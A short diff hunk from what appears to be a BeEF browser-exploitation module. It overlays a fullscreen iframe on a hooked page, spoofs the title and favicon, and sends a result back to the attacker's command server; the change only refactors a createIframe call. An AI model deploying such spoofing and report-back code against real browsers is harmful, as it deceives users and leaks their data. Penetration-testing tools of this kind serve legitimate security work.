@@ -14,7 +14,7 @@ beef.execute(function() {
 
 	$j("iframe").remove();
 	
-	beef.dom.createIframe('fullscreen', 'get', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });
+	beef.dom.createIframe('fullscreen', {'src':iframe_src}, {}, function() { if(!sent) { sent = true; document.title = title; beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+result); } });
 	document.body.scroll = "no";
 	document.documentElement.style.overflow = 'hidden';
 	beef.browser.changeFavicon(iframe_favicon);
